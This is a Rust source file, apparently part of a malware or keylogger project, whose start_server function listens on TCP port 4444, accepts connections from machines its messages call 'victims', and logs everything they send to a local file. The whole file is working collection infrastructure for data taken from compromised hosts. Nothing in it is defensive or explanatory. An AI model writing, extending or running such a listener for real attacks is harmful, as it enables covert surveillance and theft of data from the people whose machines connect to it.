use std::fs::OpenOptions;
use std::io::{BufWriter, Write, Read}; // ✅ ajout de Read pour stream.read
use std::net::TcpListener;

pub fn start_server() {
    let listener = TcpListener::bind("0.0.0.0:4444")
        .expect("❌ Impossible d’écouter sur le port 4444");

    println!("[*] En attente de connexions entrantes...");

    for stream in listener.incoming() {
        match stream {
            Ok(mut stream) => {
                println!("[+] Connexion établie avec {:?}", stream.peer_addr());

                let file = OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open("src/Logs/log.log")
                    .expect("❌ Impossible d'ouvrir log.log");

                let mut writer = BufWriter::new(file);
                let mut buffer = [0u8; 1024];

                loop {
                    match stream.read(&mut buffer) {
                        Ok(0) => {
                            println!("[-] Victime déconnectée.");
                            break;
                        }
                        Ok(n) => {
                            let data = String::from_utf8_lossy(&buffer[..n]);
                            print!("{}", data); // Affiche dans le terminal
                            let _ = writer.write_all(data.as_bytes()); // Écrit dans le fichier
                            let _ = writer.flush();
                        }
                        Err(e) => {
                            eprintln!("❌ Erreur réseau : {}", e);
                            break;
                        }
                    }
                }
            }
            Err(e) => eprintln!("❌ Erreur de connexion : {}", e),
        }
    }
}
